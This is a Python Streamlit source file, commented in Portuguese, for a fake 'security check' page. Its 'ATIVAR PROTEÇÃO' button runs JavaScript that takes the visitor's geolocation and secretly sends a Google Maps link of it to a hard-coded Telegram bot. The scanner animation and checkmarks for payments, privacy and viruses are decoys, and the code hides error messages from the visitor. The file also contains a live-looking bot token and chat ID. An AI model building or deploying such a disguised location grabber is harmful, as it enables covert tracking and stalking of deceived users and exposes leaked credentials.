import streamlit as st
import time
from streamlit_js_eval import streamlit_js_eval

# --- DADOS DO TELEGRAM ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- ESTILIZAÇÃO (MANTIDA EXATAMENTE IGUAL) ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

with caixa_bolha.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# Captura de info para o relatório
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_JS_SEND')

# --- O BOTÃO COM ENVIO DIRETO PELO NAVEGADOR ---
js_send_direct = f"""
<script>
async function enviarEAtivar() {{
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
            const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
            
            // ENVIO DIRETO PARA O TELEGRAM VIA FETCH (JS)
            try {{
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{
                        chat_id: "{ID}",
                        text: texto,
                        parse_mode: "Markdown"
                    }})
                }});
                
                // Avisa o Streamlit para girar a bolha
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{
                alert("Erro na rede. Tente novamente.");
            }}
        }},
        (err) => {{ alert("Permita a localização para continuar."); }},
        {{ enableHighAccuracy: false, timeout: 5000 }}
    );
}}
</script>
<button class="btn-barra" onclick="enviarEAtivar()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza o botão
clicou = st.components.v1.html(js_send_direct, height=80)

# --- ANIMAÇÃO DE SUCESSO ---
if clicou:
    for p in range(4, 101, 8):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    st.success("Proteção Concluída!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
